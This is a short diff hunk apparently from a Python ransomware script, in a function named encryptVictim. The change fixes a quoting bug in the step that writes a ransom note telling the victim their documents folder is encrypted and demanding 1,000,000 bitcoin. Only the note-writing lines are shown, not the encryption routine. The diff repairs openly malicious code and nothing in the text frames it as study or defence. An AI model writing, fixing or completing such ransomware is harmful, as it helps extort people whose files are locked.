@@ -141,7 +141,7 @@ def encryptVictim():
 
 		# Tell user to pay up
 
-		ransom = open("/home/ubuntu/BetterPayMe.txt, "w")
+		ransom = open("/home/ubuntu/BetterPayMe.txt", "w")
 		ransom.write("Your documents folder has been encrypted and I will need 1,000,000 bitcoin in order to decrypt!!\n Thank you have a nice day!!")
 		ransom.close()
 	except:
